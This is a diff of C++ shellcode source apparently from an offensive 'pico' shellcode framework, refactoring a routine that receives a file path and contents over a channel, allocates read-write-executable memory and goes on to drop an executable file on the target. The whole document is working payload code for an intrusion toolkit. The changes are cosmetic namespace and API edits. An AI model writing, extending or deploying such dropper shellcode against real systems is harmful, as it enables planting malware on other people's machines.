@@ -5,12 +5,13 @@
 #include "pico/memory.cc"
 #include "pico/process.cc"
 
+using namespace Pico;
+
 SHELLCODE_ENTRY
 {
     Channel channel;
     unsigned int file_sz;
     char file_path[256];
-    void *file_contents;
 
     /* Read the path. */
     channel.recv(file_path, sizeof(file_path));
@@ -19,7 +20,7 @@ SHELLCODE_ENTRY
     channel.recv(&file_sz, sizeof(file_sz));
     
     /* Read the file data. */
-    file_contents = allocate_memory(file_sz, PROT_READ|PROT_WRITE|PROT_EXEC);
+    void *file_contents = Memory::allocate(file_sz, Memory::READ | Memory::WRITE | Memory::EXEC);
     channel.recv(file_contents, file_sz);
 
     /* Drop executable file. */
